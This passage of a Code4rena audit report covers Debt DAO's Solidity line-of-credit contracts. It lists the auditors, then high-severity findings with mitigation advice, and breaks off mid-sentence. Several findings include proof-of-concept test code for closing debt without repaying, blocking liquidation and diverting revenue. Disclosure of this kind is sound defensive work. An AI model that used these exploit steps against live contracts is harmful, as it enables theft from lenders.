href=\"#n01--duplicate-import-statements\">N‑01  Duplicate import statements</a></li>\n<li><a href=\"#n02--the-nonreentrant-modifier-should-occur-before-all-other-modifiers\">N‑02  The <code>nonReentrant</code> <code>modifier</code> should occur before all other modifiers</a></li>\n<li><a href=\"#n03--contract-implements-interface-without-extending-the-interface\">N‑03  Contract implements interface without extending the interface</a></li>\n<li><a href=\"#n04--adding-a-return-statement-when-the-function-defines-a-named-return-variable-is-redundant\">N‑04  Adding a <code>return</code> statement when the function defines a named return variable, is redundant</a></li>\n<li><a href=\"#n05--requirerevert-statements-should-have-descriptive-reason-strings\">N‑05  <code>require()</code>/<code>revert()</code> statements should have descriptive reason strings</a></li>\n<li><a href=\"#n06--constants-should-be-defined-rather-than-using-magic-numbers\">N‑06  <code>constant</code>s should be defined rather than using magic numbers</a></li>\n<li><a href=\"#n07--numeric-values-having-to-do-with-time-should-use-time-units-for-readability\">N‑07  Numeric values having to do with time should use time units for readability</a></li>\n<li><a href=\"#n08--use-a-more-recent-version-of-solidity\">N‑08  Use a more recent version of Solidity</a></li>\n<li><a href=\"#n09--use-a-more-recent-version-of-solidity\">N‑09  Use a more recent version of Solidity</a></li>\n<li><a href=\"#n10--use-scientific-notation-eg-1e18-rather-than-exponentiation-eg-1018\">N‑10  Use scientific notation (e.g. <code>1e18</code>) rather than exponentiation (e.g. <code>10**18</code>)</a></li>\n<li><a href=\"#n11--constant-redefined-elsewhere\">N‑11  Constant redefined elsewhere</a></li>\n<li><a href=\"#n12--inconsistent-spacing-in-comments\">N‑12  Inconsistent spacing in comments</a></li>\n<li><a href=\"#n13--non-libraryinterface-files-should-use-fixed-compiler-versions-not-floating-ones\">N‑13  Non-library/interface files should use fixed compiler versions, not floating ones</a></li>\n<li><a href=\"#n14--file-does-not-contain-an-spdx-identifier\">N‑14  File does not contain an SPDX Identifier</a></li>\n<li><a href=\"#n15--natspec-is-incomplete\">N‑15  NatSpec is incomplete</a></li>\n<li><a href=\"#n16--event-is-missing-indexed-fields\">N‑16  Event is missing <code>indexed</code> fields</a></li>\n<li><a href=\"#n17--not-using-the-named-return-variables-anywhere-in-the-function-is-confusing\">N‑17  Not using the named return variables anywhere in the function is confusing</a></li>\n<li><a href=\"#n18--duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function\">N‑18  Duplicated <code>require()</code>/<code>revert()</code> checks should be refactored to a modifier or function</a></li>\n<li><a href=\"#excluded-non-critical-issues-findings\">Excluded Non-Critical Issues Findings</a></li>\n<li><a href=\"#n19--return-values-of-approve-not-checked\">N‑19  Return values of <code>approve()</code> not checked</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#gas-optimizations-summary\">Gas Optimizations Summary</a></li>\n<li><a href=\"#g01--state-variables-only-set-in-the-constructor-should-be-declared-immutable\">G‑01  State variables only set in the constructor should be declared <code>immutable</code></a></li>\n<li><a href=\"#g02--using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\">G‑02  Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</a></li>\n<li><a href=\"#g03--using-storage-instead-of-memory-for-structsarrays-saves-gas\">G‑03  Using <code>storage</code> instead of <code>memory</code> for structs/arrays saves gas</a></li>\n<li><a href=\"#g04--avoid-contract-existence-checks-by-using-low-level-calls\">G‑04  Avoid contract existence checks by using low level calls</a></li>\n<li><a href=\"#g05--state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\">G‑05  State variables should be cached in stack variables rather than re-reading them from storage</a></li>\n<li><a href=\"#g06--internal-functions-only-called-once-can-be-inlined-to-save-gas\">G‑06  <code>internal</code> functions only called once can be inlined to save gas</a></li>\n<li><a href=\"#g07--add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\">G‑07  Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</a></li>\n<li><a href=\"#g08--ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\">G‑08  <code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</a></li>\n<li><a href=\"#g09--requirerevert-strings-longer-than-32-bytes-cost-extra-gas\">G‑09  <code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</a></li>\n<li><a href=\"#g10--optimize-names-to-save-gas\">G‑10  Optimize names to save gas</a></li>\n<li><a href=\"#g11--usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\">G‑11  Usage of <code>uints</code>/<code>ints</code> smaller than 32 bytes (256 bits) incurs overhead</a></li>\n<li><a href=\"#g12--using-private-rather-than-public-for-constants-saves-gas\">G‑12  Using <code>private</code> rather than <code>public</code> for constants, saves gas</a></li>\n<li><a href=\"#g13--inverting-the-condition-of-an-if-else-statement-wastes-gas\">G‑13  Inverting the condition of an <code>if</code>-<code>else</code>-statement wastes gas</a></li>\n<li><a href=\"#g14--require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\">G‑14  <code>require()</code> or <code>revert()</code> statements that check input arguments should be at the top of the function</a></li>\n<li><a href=\"#g15--use-custom-errors-rather-than-revertrequire-strings-to-save-gas\">G‑15  Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</a></li>\n<li><a href=\"#g16--functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\">G‑16  Functions guaranteed to revert when called by normal users can be marked <code>payable</code></a></li>\n<li><a href=\"#excluded-findings\">Excluded findings</a></li>\n<li><a href=\"#gas-optimizations-summary-1\">Gas Optimizations Summary</a></li>\n<li><a href=\"#g17--using-bools-for-storage-incurs-overhead\">G‑17  Using <code>bool</code>s for storage incurs overhead</a></li>\n<li><a href=\"#g18--using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement\">G‑18  Using <code>> 0</code> costs more gas than <code>!= 0</code> when used on a <code>uint</code> in a <code>require()</code> statement</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the audit contest outlined in this document, C4 conducted an analysis of the Debt DAO smart contract system written in Solidity. The audit contest took place between November 3—November 10 2022.\n\n## Wardens\n\n123 Wardens contributed reports to the Debt DAO contest:\n\n  1. 0x1f8b\n  2. 0x52\n  3. [0xNazgul](https://twitter.com/0xNazgul)\n  4. [0xRajkumar](https://twitter.com/0xRajkumar)\n  5. [0xRoxas](https://twitter.com/0xRoxas)\n  6. [0xSmartContract](https://twitter.com/0xSmartContract)\n  7. 0xbepresent\n  8. 0xdeadbeef0x\n  9. [8olidity](https://twitter.com/8olidity)\n  10. Amithuddar\n  11. Awesome\n  12. [Aymen0909](https://github.com/Aymen1001)\n  13. B2\n  14. BClabs (nalus and Reptilia)\n  15. Bnke0x0\n  16. [Ch\\_301](https://twitter.com/0xch301)\n  17. Deekshith99\n  18. [Deivitto](https://twitter.com/Deivitto)\n  19. Diana\n  20. Dinesh11G\n  21. [Funen](https://instagram.com/vanensurya)\n  22. HE1M\n  23. HardlyCodeMan\n  24. IllIllI\n  25. [JC](https://twitter.com/sm4rtcontr4ct)\n  26. [Jeiwan](https://jeiwan.net)\n  27. Josiah\n  28. KingNFT\n  29. Koolex\n  30. Lambda\n  31. Metatron\n  32. [Nyx](https://twitter.com/Nyksx__)\n  33. PaludoX0\n  34. R2\n  35. [Rahoz](https://www.linkedin.com/in/nhan-vo-a9473019a/)\n  36. RaymondFam\n  37. RedOneN\n  38. ReyAdmirado\n  39. Rolezn\n  40. [Ruhum](https://twitter.com/0xruhum)\n  41. Saintcode\\_\n  42. [Satyam\\_Sharma](https://twitter/@Satyam33sharma)\n  43. SmartSek (0xDjango and hake)\n  44. [TomJ](https://mobile.twitter.com/tomj_bb)\n  45. [Tomo](https://tom-sol.notion.site/Who-am-I-3b4dc28e77b647eb90794735a94dd38e)\n  46. [Trust](https://twitter.com/trust__90)\n  47. \\_\\_141345\\_\\_\n  48. [a12jmx](https://twitter.com/a12jmx)\n  49. [adriro](https://github.com/romeroadrian)\n  50. ajtra\n  51. aphak5010\n  52. apostle0x01\n  53. ayeslick\n  54. bananasboys (miguelmtzinf and [zer0dot](https://twitter.com/zer0dots))\n  55. [berndartmueller](https://twitter.com/berndartmueller)\n  56. [bin2chen](https://twitter.com/bin2chen)\n  57. brgltd\n  58. btk\n  59. bulej93\n  60. [c3phas](https://twitter.com/c3ph_)\n  61. [carlitox477](https://twitter.com/carlitox477)\n  62. catwhiskeys\n  63. cccz\n  64. ch0bu\n  65. chaduke\n  66. chrisdior4\n  67. cloudjunky\n  68. codexploder\n  69. corerouter\n  70. cryptonue\n  71. cryptostellar5\n  72. cryptphi\n  73. [csanuragjain](https://twitter.com/csanuragjain)\n  74. ctf\\_sec\n  75. d3e4\n  76. datapunk\n  77. delfin454000\n  78. djxploit\n  79. [durianSausage](https://github.com/lyciumlee)\n  80. eierina\n  81. eighty\n  82. emrekocak\n  83. erictee\n  84. everyanykey\n  85. exolorkistis\n  86. [fatherOfBlocks](https://twitter.com/father0fBl0cks)\n  87. [gogo](https://www.linkedin.com/in/georgi-nikolaev-georgiev-978253219)\n  88. [hansfriese](https://twitter.com/hansfriese)\n  89. i\\_got\\_hacked\n  90. immeas\n  91. [joestakey](https://twitter.com/JoeStakey)\n  92. jumpdest7d\n  93. karanctf\n  94. ladboy233\n  95. lotux\n  96. lukris02\n  97. [martin](https://github.com/martin-petrov03)\n  98. mcwildy\n  99. me\\_na0mi\n  100. merlin\n  101. [minhquanym](https://www.linkedin.com/in/minhquanym/)\n  102. [oyc\\_109](https://twitter.com/andyfeili)\n  103. pashov\n  104. peanuts\n  105. pedr02b2\n  106. perseverancesuccess\n  107. rbserver\n  108. rotcivegaf\n  109. rvierdiiev\n  110. sakman\n  111. [saneryee](https://medium.com/@saneryee-studio)\n  112. [seyni](https://twitter.com/seynixyz)\n  113. shark\n  114. slowmoses\n  115. [smiling\\_heretic](https://github.com/SmilingHeretic)\n  116. tnevler\n  117. trustindistrust\n  118. w0Lfrum\n  119. [yurahod](https://www.linkedin.com/in/yurahod/)\n  120. zaskoh\n\nThis contest was judged by [LSDan](https://twitter.com/lsdan_defi).\n\nFinal report assembled by [itsmetechjay](https://twitter.com/itsmetechjay).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 17 unique vulnerabilities. Of these vulnerabilities, 6 received a risk rating in the category of HIGH severity and 11 received a risk rating in the category of MEDIUM severity.\n\nAdditionally, C4 analysis included 78 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 42 reports recommending gas optimizations.\n\nAll of the issues presented here are linked back to their original finding.\n\n# Scope\n\nThe code under review can be found within the [C4 Debt DAO contest repository](https://github.com/code-423n4/2022-11-debtdao), and is composed of 17 smart contracts written in the Solidity programming language and includes 2,511 lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com).\n\n# High Risk Findings (6)\n## [[H-01] Call to `declareInsolvent()` would revert when contract status reaches liquidation point after repayment of credit position 1](https://github.com/code-423n4/2022-11-debtdao-findings/issues/69)\n*Submitted by [cryptphi](https://github.com/code-423n4/2022-11-debtdao-findings/issues/69), also found by [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/329), [Ch\\_301](https://github.com/code-423n4/2022-11-debtdao-findings/issues/316), [PaludoX0](https://github.com/code-423n4/2022-11-debtdao-findings/issues/211), [ayeslick](https://github.com/code-423n4/2022-11-debtdao-findings/issues/166), and [perseverancesuccess](https://github.com/code-423n4/2022-11-debtdao-findings/issues/150)*\n\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L143>\n\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L83-L86>\n\n### Impact\n\nThe modifier `whileBorrowing()` is used along in the call to LineOfCredit.declareInsolvent(). However this check reverts when count == 0 or `credits[ids[0]].principal == 0` . Within the contract, any lender can add credit which adds an entry in credits array, credits\\[ids].\n\nAssume, when borrower chooses lender positions including credits\\[ids\\[0]] to draw on, and repays back the loan fully for credits\\[ids\\[1]], then the call to declareInsolvent() by the arbiter would revert since it does not pass the `whileBorrowing()` modifier check due to the ids array index shift in the call to  stepQ(), which would shift ids\\[1] to ids\\[0], thereby making the condition for `credits[ids[0]].principal == 0` be true causing the revert.\n\n### Proof of Concept\n\n1.  LineOfCredit contract is set up and 5 lenders have deposited into the contract.\n2.  Alice, the borrower borrows credit from these 5 credit positions including by calling `LineOfCredit.borrow()` for the position ids.\n3.  Later Alice pays back the loan for  credit position id 1 just before the contract gets liquidated.\n4.  At the point where `ids.stepQ()` is called in `\\_repay()`, position 1 is moved to ids\\[0]\n5.  When contract status is LIQUIDATABLE, no loan drawn on credit position 0 and arbiter calls declareInsolvent() , the call would revert since `credits[ids[0]].principal == 0`\n\n### Recommended Mitigation Steps\n\nThe modifier `whileBorrowing()` would need to be reviewed and amended.\n\n**[dmvt (judge) increased severity to High](https://github.com/code-423n4/2022-11-debtdao-findings/issues/69)**\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/69)**\n\n\n\n***\n\n## [[H-02] Non-existing revenue contract can be passed to claimRevenue to send all tokens to treasury](https://github.com/code-423n4/2022-11-debtdao-findings/issues/119)\n*Submitted by [Lambda](https://github.com/code-423n4/2022-11-debtdao-findings/issues/119), also found by [berndartmueller](https://github.com/code-423n4/2022-11-debtdao-findings/issues/462), [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/317), and [aphak5010](https://github.com/code-423n4/2022-11-debtdao-findings/issues/70)*\n\nNeither `SpigotLib.claimRevenue` nor `SpigotLib._claimRevenue` check that the provided `revenueContract` was registered before. If this is not the case, `SpigotLib._claimRevenue` assumes that this is a revenue contract with push payments (because `self.settings[revenueContract].claimFunction` is 0) and just returns the difference since the last call to `claimRevenue`:\n\n```solidity\n       if(self.settings[revenueContract].claimFunction == bytes4(0)) {\n            // push payments\n\n            // claimed = total balance - already accounted for balance\n            claimed = existingBalance - self.escrowed[token]; //@audit Rebasing tokens\n            // underflow revert ensures we have more tokens than we started with and actually claimed revenue\n        }\n```\n\n`SpigotLib.claimRevenue` will then read `self.settings[revenueContract].ownerSplit`, which is 0 for non-registered revenue contracts:\n\n```solidity\nuint256 escrowedAmount = claimed * self.settings[revenueContract].ownerSplit / 100;\n```\n\nTherefore, the whole `claimed` amount is sent to the treasury.\n\nThis becomes very problematic for revenue tokens that use push payments. An attacker (in practice the borrower) can just regularly call `claimRevenue` with this token and a non-existing revenue contract. All of the tokens that were sent to the spigot since the last call will be sent to the treasury and none to the escrow, i.e. a borrower can ensure that no revenue will be available for the lender, no matter what the configured split is.\n\n### Proof Of Concept\n\nAs mentioned above, the attack pattern works for arbitrary tokens where one (or more) revenue contracts use push payments, i.e. where the balance of the Spigot increases from time to time. Then, the attacker just calls `claimRevenue` with a non-existing address. This is illustrated in the following diff:\n\n```diff\n--- a/contracts/tests/Spigot.t.sol\n+++ b/contracts/tests/Spigot.t.sol\n@@ -174,7 +174,7 @@ contract SpigotTest is Test {\n         assertEq(token.balanceOf(address(spigot)), totalRevenue);\n         \n         bytes memory claimData;\n-        spigot.claimRevenue(revenueContract, address(token), claimData);\n+        spigot.claimRevenue(address(0), address(token), claimData);\n```\n\nThanks to this small modification, all of the tokens are sent to the treasury and none are sent to the escrow.\n\n### Recommended Mitigation Steps\n\nCheck that a revenue contract was registered before, revert if it does not.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/119)** \n\n\n***\n\n## [[H-03] addCredit / increaseCredit cannot be called by lender first when token is ETH](https://github.com/code-423n4/2022-11-debtdao-findings/issues/125)\n*Submitted by [Lambda](https://github.com/code-423n4/2022-11-debtdao-findings/issues/125), also found by [berndartmueller](https://github.com/code-423n4/2022-11-debtdao-findings/issues/471), [Trust](https://github.com/code-423n4/2022-11-debtdao-findings/issues/430), [minhquanym](https://github.com/code-423n4/2022-11-debtdao-findings/issues/351), [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/325), and [HE1M](https://github.com/code-423n4/2022-11-debtdao-findings/issues/42)*\n\n<https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L234>\n\n<https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L270>\n\n### Impact\n\nThe functions `addCredit` and `increaseCredit` both ahve a `mutualConsent` or `mutualConsentById` modifier. Furthermore, these functions are `payable` and the lender needs to send the corresponding ETH with each call. However, if we look at the mutual consent modifier works, we can have a problem:\n\n```solidity\nmodifier mutualConsent(address _signerOne, address _signerTwo) {\n      if(_mutualConsent(_signerOne, _signerTwo))  {\n        // Run whatever code needed 2/2 consent\n        _;\n      }\n}\n\nfunction _mutualConsent(address _signerOne, address _signerTwo) internal returns(bool) {\n        if(msg.sender != _signerOne && msg.sender != _signerTwo) { revert Unauthorized(); }\n\n        address nonCaller = _getNonCaller(_signerOne, _signerTwo);\n\n        // The consent hash is defined by the hash of the transaction call data and sender of msg,\n        // which uniquely identifies the function, arguments, and sender.\n        bytes32 expectedHash = keccak256(abi.encodePacked(msg.data, nonCaller));\n\n        if (!mutualConsents[expectedHash]) {\n            bytes32 newHash = keccak256(abi.encodePacked(msg.data, msg.sender));\n\n            mutualConsents[newHash] = true;\n\n            emit MutualConsentRegistered(newHash);\n\n            return false;\n        }\n\n        delete mutualConsents[expectedHash];\n\n        return true;\n}\n```\n\nThe problem is: On the first call, when the other party has not given consent to the call yet, the modifier does not revert. It sets the consent of the calling party instead.\n\nThis is very problematic in combination with sending ETH for two reasons:\n1. When the lender performs the calls first and sends ETH along with the call, the call will not revert. It will instead set the consent for him, but the sent ETH is lost.\n2. Even when the lender thinks about this and does not provide any ETH on the first call, the borrower has to perform the second call. Of course, he will not provide the ETH with this call, but this will cause the transaction to revert. There is now no way for the borrower to also grant consent, but still let the lender perform the call.\n\n### Proof Of Concept\n\nLender Alice calls `LineOfCredit.addCredit` first to add a credit with 1 ETH. She sends 1 ETH with the call. However, because borrower Bob has not performed this call yet, the function body is not executed, but the 1 ETH is still sent. Afterwards, Bob wants to give his consent, so he performs the same call. However, this call reverts, because Bob does not send any ETH with it.\n\n### Recommended Mitigation Steps\n\nConsider implementing an external function to grant consent to avoid this scenario. Also consider reverting when ETH is sent along, but the other party has not given their consent yet.\n\n**[dmvt (judge) increased severity to High](https://github.com/code-423n4/2022-11-debtdao-findings/issues/125)**\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/125)**\n\n\n\n***\n\n## [[H-04] Borrower can close a credit without repaying debt](https://github.com/code-423n4/2022-11-debtdao-findings/issues/258)\n*Submitted by [Jeiwan](https://github.com/code-423n4/2022-11-debtdao-findings/issues/258), also found by [joestakey](https://github.com/code-423n4/2022-11-debtdao-findings/issues/527), [berndartmueller](https://github.com/code-423n4/2022-11-debtdao-findings/issues/472), [smiling\\_heretic](https://github.com/code-423n4/2022-11-debtdao-findings/issues/394), [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/334), [hansfriese](https://github.com/code-423n4/2022-11-debtdao-findings/issues/298), and [bin2chen](https://github.com/code-423n4/2022-11-debtdao-findings/issues/272)*\n\nA borrower can close a credit without repaying the debt to the lender. The lender will be left with a bad debt and the borrower will keep the borrowed amount and the collateral.\n\n### Proof of Concept\n\nThe `close` function of `LineOfCredit` doesn't check whether a credit exists or not. As a result, the `count` variable is decreased in the internal `_close` function when the `close` function is called with an non-existent credit ID:\n[LineOfCredit.sol#L388](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388):\n\n```solidity\nfunction close(bytes32 id) external payable override returns (bool) {\n    Credit memory credit = credits[id];\n    address b = borrower; // gas savings\n    if(msg.sender != credit.lender && msg.sender != b) {\n      revert CallerAccessDenied();\n    }\n\n    // ensure all money owed is accounted for. Accrue facility fee since prinicpal was paid off\n    credit = _accrue(credit, id);\n    uint256 facilityFee = credit.interestAccrued;\n    if(facilityFee > 0) {\n      // only allow repaying interest since they are skipping repayment queue.\n      // If principal still owed, _close() MUST fail\n      LineLib.receiveTokenOrETH(credit.token, b, facilityFee);\n\n      credit = _repay(credit, id, facilityFee);\n    }\n\n    _close(credit, id); // deleted; no need to save to storage\n\n    return true;\n}\n```\n\n[LineOfCredit.sol#L483](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483):\n\n```solidity\nfunction _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n    if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }\n\n    // return the Lender's funds that are being repaid\n    if (credit.deposit + credit.interestRepaid > 0) {\n        LineLib.sendOutTokenOrETH(\n            credit.token,\n            credit.lender,\n            credit.deposit + credit.interestRepaid\n        );\n    }\n\n    delete credits[id]; // gas refunds\n\n    // remove from active list\n    ids.removePosition(id);\n    unchecked { --count; }\n\n    // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.\n    if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }\n\n    emit CloseCreditPosition(id);\n\n    return true;\n}\n```\n\nProof of Concept:\n\n```solidity\n// contracts/tests/LineOfCredit.t.sol\nfunction testCloseWithoutRepaying_AUDIT() public {\n    assertEq(supportedToken1.balanceOf(address(line)), 0, \"Line balance should be 0\");\n    assertEq(supportedToken1.balanceOf(lender), mintAmount, \"Lender should have initial mint balance\");\n      \n    _addCredit(address(supportedToken1), 1 ether);\n\n    bytes32 id = line.ids(0);\n    assert(id != bytes32(0));\n\n    assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether, \"Lender should have initial balance less lent amount\");\n    \n    hoax(borrower);\n    line.borrow(id, 1 ether);\n    assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether, \"Borrower should have initial balance + loan\");\n    \n    // The credit hasn't been repaid.\n    // hoax(borrower);\n    // line.depositAndRepay(1 ether);\n    \n    hoax(borrower);\n    // Closing with a non-existent credit ID.\n    line.close(bytes32(uint256(31337)));\n\n    // The debt hasn't been repaid but the status is REPAID.\n    assertEq(uint(line.status()), uint(LineLib.STATUS.REPAID));\n\n    // Lender's balance is still reduced by the borrow amount.\n    assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether);\n\n    // Borrower's balance still includes the borrowed amount.\n    assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether);\n}\n```\n\n### Recommended Mitigation Steps\n\nIn the `close` function of `LineOfCredit`, consider ensuring that a credit with the user-supplied ID exists, before closing it.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/258)**\n\n\n***\n\n## [[H-05] Borrower can craft a borrow that cannot be liquidated, even by arbiter. ](https://github.com/code-423n4/2022-11-debtdao-findings/issues/421)\n*Submitted by [Trust](https://github.com/code-423n4/2022-11-debtdao-findings/issues/421), also found by [bin2chen](https://github.com/code-423n4/2022-11-debtdao-findings/issues/281)*\n\nLineOfCredit manages an array of open credit line identifiers called `ids`. Many interactions with the Line operate on ids\\[0], which is presumed to be the oldest borrow which has non zero principal. For example, borrowers must first deposit and repay to ids\\[0] before other credit lines. \n\nThe list is managed by several functions:\n\n1.  CreditListLib.removePosition - deletes parameter id in the ids array\n2.  CreditListLib.stepQ - rotates all ids members one to the left, with the leftmost becoming the last element\n3.  \\_sortIntoQ - most complex function, finds the smallest index which can swap identifiers with the parameter id, which satisfies the conditions:\n    1.  target index is not empty\n    2.  there is no principal owed for the target index's credit\n\nThe idea I had is that if we could corrupt the ids array so that ids\\[0] would be zero, but after it there would be some other active borrows, it would be a very severe situation. The whileBorrowing() modifier assumes if the first element has no principal, borrower is not borrowing. \n\n    modifier whileBorrowing() {\n        if(count == 0 || credits[ids[0]].principal == 0) { revert NotBorrowing(); }\n        _;\n    }\n\nIt turns out there is a simple sequence of calls which allows borrowing while ids\\[0] is deleted, and does not re-arrange the new borrow into ids\\[0]!\n\n1.  id1 = `addCredit()` - add a new credit line, a new id is pushed to the end of ids array.\n2.  id2 = `addCredit()` - called again, ids.length = 2\n3.  close(id1) - calls `removePosition()` on id1, now ids array is \\[0x000000000000000000000000, id2 ]\n4.  borrow(id2) - will borrow from id2 and call `\\_sortIntoQ`. The sorting loop will not find another index other than id2's existing index (`id == bytes32(0)` is true).\n\nFrom this sequence, we achieve a borrow while ids\\[0] is 0! Therefore, credits\\[ids\\[0]].principal = credits\\[0].principal = 0, and whileBorrowing() reverts.\n\nThe impact is massive - the following functions are disabled:\n\n*   `SecureLine::liquidate()`\n*   `LineOfCredit::depositAndClose()`\n*   `LineOfCredit::depositAndRepay()`\n*   `LineOfCredit::claimAndRepay()`\n*   `LineOfCredit::claimAndTrade()`\n\n### Impact\n\nBorrower can craft a borrow that cannot be liquidated, even by arbiter. Alternatively, functionality may be completely impaired through no fault of users.\n\n### Proof of Concept\n\nCopy the following code into LineOfCredit.t.sol\n\n    function _addCreditLender2(address token, uint256 amount) public {\n        // Prepare lender 2 operations, does same as mintAndApprove()\n        address lender2 = address(21);\n        deal(lender2, mintAmount);\n        supportedToken1.mint(lender2, mintAmount);\n        supportedToken2.mint(lender2, mintAmount);\n        unsupportedToken.mint(lender2, mintAmount);\n        vm.startPrank(lender2);\n        supportedToken1.approve(address(line), MAX_INT);\n        supportedToken2.approve(address(line), MAX_INT);\n        unsupportedToken.approve(address(line), MAX_INT);\n        vm.stopPrank();\n        // addCredit logic\n        vm.prank(borrower);\n        line.addCredit(dRate, fRate, amount, token, lender2);\n        vm.stopPrank();\n        vm.prank(lender2);\n        line.addCredit(dRate, fRate, amount, token, lender2);\n        vm.stopPrank();\n    }\n    function test_attackUnliquidatable() public {\n        bytes32 id_1;\n        bytes32 id_2;\n        _addCredit(address(supportedToken1), 1 ether);\n        _addCreditLender2(address(supportedToken1), 1 ether);\n        id_1 =  line.ids(0);\n        id_2 =  line.ids(1);\n        hoax(borrower);\n        line.close(id_1);\n        hoax(borrower);\n        line.borrow(id_2, 1 ether);\n        id_1 =  line.ids(0);\n        id_2 = line.ids(1);\n        console.log(\"id1 : \", uint256(id_1));\n        console.log(\"id2 : \", uint256(id_2));\n        vm.warp(ttl+1);\n        assert(line.healthcheck() == LineLib.STATUS.LIQUIDATABLE);\n        vm.expectRevert(ILineOfCredit.NotBorrowing.selector);\n        bool isSolvent = line.declareInsolvent();\n    }\n\n### Recommended Mitigation Steps\n\nWhen sorting new borrows into the ids queue, do not skip any elements.\n\n**[dmvt (judge) marked as nullified](https://github.com/code-423n4/2022-11-debtdao-findings/issues/421)**\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/421#issuecomment-1341256600):**\n > Unclear why this issue is nullified, I have demonstrated a POC that shows line cannot be declared insolvent.\n\n**[dmvt (judge) re-opened the issue and commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/421#issuecomment-1343253554):**\n > Kicking back to the sponsor for another look. I'm inclined to bring this one back as valid unless the sponsor can show why it isn't.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/421#issuecomment-1405074802)**\n\n\n\n***\n\n## [[H-06] Repaying a line of credit with a higher than necessary claimed revenue amount will force the borrower into liquidation](https://github.com/code-423n4/2022-11-debtdao-findings/issues/461)\n*Submitted by [berndartmueller](https://github.com/code-423n4/2022-11-debtdao-findings/issues/461), also found by [Trust](https://github.com/code-423n4/2022-11-debtdao-findings/issues/418), [hansfriese](https://github.com/code-423n4/2022-11-debtdao-findings/issues/414), [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/336), [0xdeadbeef0x](https://github.com/code-423n4/2022-11-debtdao-findings/issues/210), [aphak5010](https://github.com/code-423n4/2022-11-debtdao-findings/issues/93), and [rvierdiiev](https://github.com/code-423n4/2022-11-debtdao-findings/issues/82)*\n\nA borrower can repay (parts) of a credit line with the `SpigotedLine.useAndRepay` function. This function will use `amount` of `unusedTokens[credit.token]` as a repayment. However, if `amount` exceeds the principal and the accrued interest, `credit.principal` will underflow without an error and set the principal value to a very large number.\n\nThis a problem because a borrower can unknowingly provide a larger than necessary `amount` to the `SpigotedLine.useAndRepay` function to make sure enough funds are used to fully repay the principal and the remaining interest.\n\nAdditionally, a lender can do the same thing as the lender can call this function.\n\n### Impact\n\nThe `credit.principal` underflows without an error and will be set to a very large number. This will force a secured line **immediately** into liquidation. Additionally, having a principal value close to `2^256 - 